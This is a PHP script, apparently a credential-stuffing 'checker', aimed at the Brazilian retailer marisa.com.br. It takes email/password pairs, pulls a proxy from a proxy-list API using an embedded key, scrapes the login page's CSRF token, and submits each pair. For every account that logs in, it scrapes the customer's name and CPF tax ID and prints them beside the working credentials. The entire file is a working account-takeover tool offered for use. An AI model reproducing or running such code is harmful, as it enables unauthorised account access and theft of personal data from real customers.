<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados
         
        $link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
        $link2 = json_decode($link);
        $link3 = $link2 ->ip;
        $link4 = $link2 ->port;
        $proxy = $link3.":".$link4;

        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.marisa.com.br/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.marisa.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'GTM-LoginButtonClicked: true',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.marisa.com.br/',
        'Referer: https://www.marisa.com.br/login',
        'Connection: keep-alive',
    ));
        curl_setopt($ch, CURLOPT_POST, 0);
        $result = curl_exec($ch);

        //echo $result;

        $token = dados($result, 'type="hidden" name="CSRFToken" value="', '"', 1);

        
        


        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.marisa.com.br/j_spring_security_check");  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.marisa.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'GTM-LoginButtonClicked: true',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.marisa.com.br/',
        'Referer: https://www.marisa.com.br/login',
        'Connection: keep-alive',
    ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'j_username='.$email.'&j_password='.$senha.'&CSRFToken='.$token.'');   
        $result2 = curl_exec($ch);
        //echo $result2;


        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.marisa.com.br/my-account/profile");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.marisa.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'GTM-LoginButtonClicked: true',
        'Accept-Language: pt-BR,pt;q=0.5',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.marisa.com.br/',
        'Referer: https://www.marisa.com.br/login',
        'Connection: keep-alive',
    ));
        curl_setopt($ch, CURLOPT_POST, 0);
        $result3 = curl_exec($ch);
        //echo $result3;

        $nome = dados($result3, '"name": "', '"', 1);
        $cpf = dados($result3, '"documentId": "', '"', 1);

        
       
        // aqui e a mensagem de aprovada

        if (strpos($result2, '"username"') !== false) {

            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | NOME: $nome | CPF: $cpf | <font style='color: MidnightBlue;'>#BlackStar</font></b>";
         
           

        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>#BlackStar</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>